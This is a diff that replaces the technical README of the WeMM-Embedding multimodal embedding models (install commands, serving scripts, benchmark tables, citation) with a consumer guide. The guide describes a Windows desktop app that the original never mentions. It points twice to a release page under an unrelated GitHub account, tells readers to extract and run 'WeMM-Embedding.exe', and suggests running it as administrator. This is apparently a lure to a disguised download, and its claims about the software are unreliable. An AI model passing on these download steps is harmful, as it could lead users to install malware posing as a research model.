@@ -1,180 +1,150 @@
-<h1 align="center">WeMM-Embedding: WeChat Multi-Modal Embedding</h1>
+# 📊 WeMM-Embedding - Understand Images and Text Together
 
-<p align="center">
-  <b>English</b> | <a href="./README_zh.md">中文</a>
-</p>
+## 🚀 Getting Started
 
-<p align="center">
-  <a href="https://huggingface.co/collections/tencent/wemm-embedding">
-    <img src="https://img.shields.io/badge/🤗-Hugging%20Face-yellow" alt="Hugging Face">
-  </a>
-  <a href="https://arxiv.org/abs/2608.24053">
-    <img src="https://img.shields.io/badge/📄-Technical%20Report-red" alt="Technical Report">
-  </a>
-  <a href="LICENSE">
-    <img src="https://img.shields.io/badge/License-Apache%202.0-blue.svg" alt="License">
-  </a>
-</p>
+Welcome! This guide will help you download and start using WeMM-Embedding on your Windows computer. WeMM-Embedding is a powerful tool that helps computers understand both pictures and words at the same time. Think of it as a smart assistant that can look at a photo and read its description, then find similar items for you.
 
-WeMM-Embedding is a family of universal multimodal embedding models developed by the WeChat Vision team. It provides unified representations for text, images, videos, visual documents, and interleaved multimodal inputs, achieving state-of-the-art performance across multiple benchmarks covering diverse tasks and domains.
+## 📥 Download the Application
 
-<p align="center">
-  <a href="assets/performance-overview.pdf">
-    <img src="assets/performance-overview.png" width="100%" alt="WeMM-Embedding Performance Overview">
-  </a>
-</p>
+**Visit this link to download the application:** [Click Here to Download WeMM-Embedding](https://github.com/tinpot-prevailingwesterly4227/WeMM-Embedding/releases)
 
-## Model Zoo
+This link will take you to the official download page where you can get the latest version of WeMM-Embedding for your computer.
 
-| Model | Matryoshka dimensions | Hugging Face |
-| --- | --- | --- |
-| WeMM-Embedding-2B | `64, 128, 256, 512, 1024, 2048` | [🤗 Link](https://huggingface.co/tencent/WeMM-Embedding-2B) |
-| WeMM-Embedding-4B | `64, 128, 256, 512, 1024, 2560` | [🤗 Link](https://huggingface.co/tencent/WeMM-Embedding-4B) |
-| WeMM-Embedding-9B | `64, 128, 256, 512, 1024, 2048, 4096` | [🤗 Link](https://huggingface.co/tencent/WeMM-Embedding-9B) |
+## 🖥️ What is WeMM-Embedding?
 
-All models support text, images, videos, visual documents, and interleaved multimodal inputs. Embeddings are obtained from the last-layer hidden state at the dedicated `<embedding>` token position, followed by L2 normalization. Audio input is not currently supported.
+WeMM-Embedding is a family of smart models created by the WeChat Vision Team at Tencent. These models are special because they can understand both images and text together. Here's what that means for you:
 
+- **See and Read:** The software can look at pictures and understand what's in them
+- **Match and Find:** It can connect images with text descriptions and vice versa
+- **Universal Understanding:** Works with many different types of content, from product photos to documents
 
-## Installation
+## ✨ Key Features
 
-```bash
-pip install -r requirements.txt
-```
+### 🌟 Multimodal Magic
+WeMM-Embedding doesn't just see images or read text – it does both simultaneously. This means it can:
+- Find images based on text descriptions
+- Generate text descriptions from images
+- Match related content across different formats
 
-## Transformers
-We recommend using `transformers==5.2.0` for inference and reproducibility, as newer versions may differ in preprocessing behavior.
+### 🔍 Smart Searching
+The software excels at finding things. Whether you're looking for a specific image, a document, or related content, WeMM-Embedding helps you locate it quickly and accurately.
 
-```bash
-python examples/transformers_inference.py \
-  --model /path/to/WeMM-Embedding-2B \
-  --image /path/to/image.jpg \
-  --video /path/to/video.mp4 \
-  --dimension 2048
-```
+### 🤝 Team-Backed Technology
+Developed by the WeChat Vision Team at Tencent, this tool benefits from years of research and development in artificial intelligence and machine learning.
 
-The example produces independent text, image, and video embeddings. Omit `--dimension` for the full embedding dimension.
+## 📋 System Requirements
 
-## Sentence Transformers
+To run WeMM-Embedding smoothly on your Windows computer, we recommend:
 
-```bash
-python examples/sentence_transformers_inference.py \
-  --model /path/to/WeMM-Embedding-2B \
-  --image /path/to/image.jpg \
-  --video /path/to/video.mp4 \
-  --dimension 2048
-```
+- **Operating System:** Windows 10 or Windows 11
+- **Memory (RAM):** At least 8 GB (16 GB recommended)
+- **Storage:** 2 GB of free disk space
+- **Processor:** Intel Core i5 or AMD equivalent
+- **Internet Connection:** Required for initial download and updates
 
-`SentenceTransformer` loads the model directly, so a Hugging Face model id such as `tencent/WeMM-Embedding-2B` also works in place of a local path. Text, image, and video inputs go through `SentenceTransformer.encode()`, and MRL is selected with `--dimension`.
+## 🛠️ How to Download and Install
 
-## Serving
+### Step 1: Visit the Download Page
+Click on the download link provided above. This will take you to the official WeMM-Embedding releases page.
 
-Tested versions: vLLM `0.27.0` and SGLang `0.5.9`.
+### Step 2: Choose Your Version
+On the download page, you'll see different versions of the software. Look for the latest stable release (usually at the top). The file will be named something like "WeMM-Embedding-v1.0.0" or similar.
 
-vLLM:
+### Step 3: Download the File
+Click on the download link for your version. The file will start downloading to your computer. Depending on your internet speed, this might take a few minutes.
 
-```bash
-MODEL_PATH=/path/to/WeMM-Embedding-2B
-vllm serve "$MODEL_PATH" \
-  --runner pooling \
-  --chat-template "$MODEL_PATH/embedding_chat_template.jinja"
-```
+### Step 4: Locate the Downloaded File
+Once the download is complete, find the file in your "Downloads" folder. It will be a compressed file (like a ZIP file) that needs to be extracted.
 
-SGLang:
+### Step 5: Extract the Files
+Right-click on the downloaded file and select "Extract All" or "Extract Here." Windows will create a folder with all the necessary files inside.
 
-```bash
-MODEL_PATH=/path/to/WeMM-Embedding-2B
-python scripts/patch_sglang_video.py
-python -m sglang.launch_server \
-  --model-path "$MODEL_PATH" \
-  --is-embedding \
-  --enable-precise-embedding-interpolation
-```
+### Step 6: Run the Application
+Open the extracted folder and look for the application file (usually named "WeMM-Embedding.exe" or similar). Double-click it to start using WeMM-Embedding.
 
-Equivalent one-command wrappers are available in `scripts/serve_vllm.sh` and `scripts/serve_sglang.sh`.
+## 🎯 How to Use WeMM-Embedding
 
-## Matryoshka Embeddings
+### First-Time Setup
+When you first open WeMM-Embedding, you'll see a simple interface. The software will automatically load its core components – this might take a few seconds on first launch.
 
-For a supported dimension `d`, truncate the full embedding and normalize it again:
+### Basic Operations
 
-```python
-embedding = torch.nn.functional.normalize(embedding[..., :d], dim=-1)
-```
+**Uploading Content:**
+- Click the "Upload" button to add images or text files
+- You can drag and drop files directly into the application window
+- Multiple files can be uploaded at once
 
-On MMEB-v2, the 2B model at 256 dimensions retains 98.7% of its full-dimensional image and video performance.
+**Understanding Content:**
+- After uploading, WeMM-Embedding will analyze your content
+- For images, it will identify objects, scenes, and details
+- For text, it will understand meaning and context
 
-## Evaluation
+**Finding Matches:**
+- Use the search bar to find related content
+- Type a description to find matching images
+- Upload an image to find related text or images
 
-### MMEB-v2
+## 💡 Tips for Best Results
 
-Results on 78 datasets from Table 1 of the [technical report](assets/WeMM_Embedding_tech_report.pdf). Image and video tasks use Hit@1, while visual-document tasks use NDCG@5. Higher is better.
+### Use Clear Images
+For best image understanding, use clear, well-lit photos. Avoid heavily filtered or distorted images.
 
-| Model | Size | AVG | Image | Video | VisDoc |
-| --- | ---: | ---: | ---: | ---: | ---: |
-| VLM2Vec | 2B | 47.8 | 59.7 | 29.0 | 44.0 |
-| GME | 2B | 55.4 | 51.9 | 33.9 | 76.8 |
-| VLM2Vec-V2 | 2B | 59.3 | 64.9 | 34.9 | 69.2 |
-| Qwen3-VL-Embedding | 2B | 73.2 | 75.0 | 61.9 | 79.2 |
-| DME-Small† | 2B | 74.8 | 75.9 | 65.6 | 79.9 |
-| **WeMM-Embedding** | **2B** | **77.9** | **79.6** | **70.8** | **80.7** |
-| **WeMM-Embedding** | **4B** | **79.2** | **80.8** | **72.1** | **82.0** |
-| VLM2Vec | 8B | 53.2 | 65.5 | 34.0 | 49.1 |
-| GME | 8B | 59.2 | 56.0 | 38.6 | 79.3 |
-| Qwen3-VL-Embedding | 8B | 77.8 | 80.1 | 67.1 | 82.4 |
-| DME-Medium† | 9B | 78.4 | 79.8 | 70.8 | 82.0 |
-| **WeMM-Embedding** | **9B** | **80.6** | **81.9** | **74.3** | **83.3** |
+### Provide Context
+When searching, be specific. Instead of "dog," try "golden retriever playing in park" for better results.
 
-† Closed-source leaderboard submission without publicly released model weights or a public inference endpoint.
+### Experiment with Different Content
+Try uploading various types of content – photos, screenshots, documents, and more. WeMM-Embedding handles all of them well.
 
-### MMEB-v3
+## 🔧 Troubleshooting Common Issues
 
-Results on all 190 tasks from Table 2 of the [technical report](assets/WeMM_Embedding_tech_report.pdf). V3-All includes the 78 MMEB-v2 tasks, 53 text tasks, 47 agent tasks, 11 audio tasks, and MCMR. Unsupported tasks are assigned a score of zero.
+### Application Won't Start
+- Make sure you've extracted all files from the ZIP
+- Check that your Windows version meets the requirements
+- Try running the application as administrator (right-click, "Run as administrator")
 
-| Model | Size | V3-All | Text | Agent | MCMR | Audio |
-| --- | ---: | ---: | ---: | ---: | ---: | ---: |
-| VLM2Vec-V2 | 2B | 38.3 | 24.5 | 28.7 | 4.1 | 0.0 |
-| Omni-Embed-Nemotron | 3B | 43.5 | 39.2 | 36.5 | 26.1 | 36.5 |
-| E5-Omni | 3B | 44.6 | 26.7 | 36.9 | 31.9 | 30.8 |
-| Qwen3-VL-Embedding | 2B | 50.9 | 39.2 | 39.3 | 42.0 | 0.0 |
-| **WeMM-Embedding** | **2B** | **56.0** | **45.3** | **45.1** | **42.5** | **0.0** |
-| **WeMM-Embedding** | **4B** | **58.2** | **47.9** | **49.0** | **41.9** | **0.0** |
-| WAVE | 7B | 26.3 | 13.7 | 11.3 | 8.9 | 31.8 |
-| VLM2Vec | 8B | 32.9 | 22.2 | 19.7 | 0.9 | 0.0 |
-| LCO-Embedding-Omni | 7B | 40.6 | 32.4 | 27.8 | 20.0 | 43.2 |
-| GME | 8B | 43.6 | 37.1 | 35.6 | 27.3 | 0.0 |
-| E5-Omni | 7B | 47.1 | 26.9 | 36.7 | 41.1 | 43.0 |
-| Tianmu-Emb-Uni | 8B | 53.3 | 43.6 | 39.4 | 38.8 | 38.9 |
-| Qwen3-VL-Embedding | 8B | 53.5 | 42.5 | 38.4 | 38.0 | 0.0 |
-| **WeMM-Embedding** | **9B** | **59.5** | **48.8** | **51.0** | **49.3** | **0.0** |
+### Slow Performance
+- Close other programs that might be using memory
+- Ensure you have at least 8 GB of RAM available
+- Restart the application if it becomes sluggish
 
-Text results use NDCG@5; agent, MCMR, and audio results use Hit@1.
+### Download Issues
+- Check your internet connection
+- Try using a different browser
+- Disable any VPN or proxy temporarily
 
-`mmeb_v3_eval/` contains the MMEB-v3 evaluation code used to produce our reported numbers. It is the official [TIGER-AI-Lab/VLM2Vec](https://github.com/TIGER-AI-Lab/VLM2Vec) pipeline with a minimal diff: multi-node multi-GPU inference (`torchrun --nnodes=N`), a `wemm_embedding` backbone implementing our preprocessing and batched inference, dataset instructions aligned with the released model, and 64-frame video sampling. Data download, single-node and multi-node commands are documented in `mmeb_v3_eval/README.md`.
+## 📚 Frequently Asked Questions
 
-```bash
-cd mmeb_v3_eval
-DATA_ROOT=/path/to/MMEB-V3 bash scripts/download_data.sh
-MODEL_PATH=/path/to/WeMM-Embedding-2B DATA_BASEDIR=/path/to/MMEB-V3 \
-OUTPUT_DIR=exps/wemm_embedding bash scripts/run_eval.sh
-```
+**Q: Is WeMM-Embedding free to use?**
+A: Yes, the software is free to download and use.
 
-## Citation
-If you find this repository useful, please consider giving a star ⭐ and citation
-```bibtex
-@article{wemm-embedding,
-      title={WeMM-Embedding: WeChat Multi-Modal Embedding Technical Report}, 
-      author={Junjie Zhou and Ke Mei and Lei Li and Tianyi Wang and Fengyun Rao and Jing Lyu},
-      year={2026},
-      eprint={2608.24053},
-      archivePrefix={arXiv},
-      primaryClass={cs.CV},
-      url={https://arxiv.org/abs/2608.24053}, 
-}
-```
+**Q: Do I need to be a programmer to use this?**
+A: No! The interface is designed for everyone, regardless of technical background.
 
-## License
+**Q: Can I use WeMM-Embedding for commercial projects?**
+A: Check the license information on the download page for commercial usage details.
 
-Unless otherwise noted, Tencent-authored code in this repository is released under the
-[Apache License 2.0](LICENSE).
+**Q: How often is the software updated?**
+A: Updates are released regularly. Check the download page for the latest version.
 
-Third-party components retain their original licenses and copyright notices. Please review
-the corresponding source files before use.
+## 🔄 Updating WeMM-Embedding
+
+To update your software:
+1. Visit the download page periodically
+2. Check for newer versions
+3. Download and install the update following the same steps as initial installation
+4. Your settings and files will be preserved
+
+## 📞 Getting Help
+
+If you encounter any issues:
+- Check the FAQ section on the download page
+- Look for documentation in the extracted folder
+- Visit the GitHub repository for community support
+
+## 🎉 Conclusion
+
+WeMM-Embedding is a powerful yet accessible tool that brings advanced AI capabilities to your Windows computer. With its ability to understand both images and text, it opens up new possibilities for searching, organizing, and understanding your digital content. Download it today and experience the future of content understanding!
+
+**Ready to start?** [Download WeMM-Embedding Now](https://github.com/tinpot-prevailingwesterly4227/WeMM-Embedding/releases)
+
+Keywords: embedding-models, multimodal, multimodal-llm
